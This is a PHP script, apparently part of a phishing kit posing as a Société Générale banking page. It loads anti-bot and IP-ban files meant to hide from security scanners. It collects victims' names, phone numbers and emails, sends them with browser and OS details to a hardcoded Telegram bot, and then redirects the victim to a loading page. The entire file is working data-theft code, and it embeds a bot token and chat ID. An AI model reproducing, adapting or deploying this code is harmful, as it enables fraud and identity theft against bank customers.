<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

// Récupération des données du formulaire
$lastName = isset($_POST['lastName']) ? $_POST['lastName'] : '';
$firstName = isset($_POST['firstName']) ? $_POST['firstName'] : '';
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';

$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Message à envoyer
if ($lastName && $firstName && $phone && $email) {
    $message = "📝 Informations personnelles reçues :\n\n👤 Nom : $lastName\n👤 Prénom : $firstName\n📞 Téléphone : $phone\n📧 Email : $email\n\n🌐 OS : " . getOs($_SERVER['HTTP_USER_AGENT']) . "\n🌍 Navigateur : " . getBrowser($_SERVER['HTTP_USER_AGENT']);
} else {
    $message = "❌ Aucune donnée complète reçue dans le formulaire infos.";
}

// Envoi du message via Telegram
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
file_get_contents($sendMessageUrl);

// Redirection après soumission
if ($lastName && $firstName && $phone && $email) {
    header("Location: ../loading.php");
    exit;
} else {
    header("Location: ../loading.php");
    exit;
}
?>
